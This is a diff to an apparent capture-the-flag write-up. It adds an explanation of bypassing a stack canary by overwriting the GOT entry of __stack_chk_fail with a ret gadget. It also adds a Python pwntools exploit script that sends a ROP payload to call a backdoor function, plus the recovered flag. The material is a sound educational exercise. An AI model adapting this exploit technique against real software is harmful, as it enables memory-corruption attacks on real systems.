@@ -149,16 +149,49 @@ We need to bypass this!
 
 To do that we would leverage the Write-What-Where primitive to overwrite the GOT of the `__stack_chk_fail` function so that when it's called it justs `ret`
 
-The idea is that when we overwrite the global offset table of the `__stack_chk_fail` function to a `ret` instruction, when we perform the buffer overflow the function is going to be called, but since it points to an instruction `ret` it would just return and continue execution like nothing happened which then allows us to overwrite the saved rbp and the return address because this is how the stack layout is:
+The idea is that when we overwrite the global offset table of the `__stack_chk_fail` function to a `ret` instruction, when we perform the buffer overflow the function is going to be called, but since it points to an instruction `ret` it would just return and continue execution like nothing happened which then allows us to overwrite the saved rbp and the return address because of how stack layout is:
+![image](https://github.com/user-attachments/assets/db6c4bfd-1939-4e73-90e7-87f5a05b99f7)
+
+This is my exploit script buf i'm showing just the solve function since the rest are pretty much just templates:
+
+```python
+def solve():
+
+    offset = 56
+    pop_rdi_rsi = 0x40139b
+    ret = 0x40101a
+    stack_chk = exe.got['__stack_chk_fail']
+    
+    io.recvuntil("feedback?")
+    io.sendline("yes")
+
+    io.recvuntil(".")
+    io.send(p64(stack_chk))
+
+    io.recvuntil("..")
+    io.send(p64(ret))
+
+    payload = flat({
+        offset: [
+            pop_rdi_rsi,
+            0xdead,
+            0xbeef,
+            exe.sym['backdoor']
+        ]
+    })
+
+    io.recvuntil("...")
+    io.sendline(payload)
+
+    io.interactive()
+```
+
+Running it works!
+![image](https://github.com/user-attachments/assets/efedac64-a0be-4c19-bf00-dd954daba1c1)
 
 ```
-buffer -> stack canary -> saved rbp -> return address
+Flag: csean{g0t_0v3rwr1t3_15_fuN}24
 ```
-
-
-
-
-
 
 
 
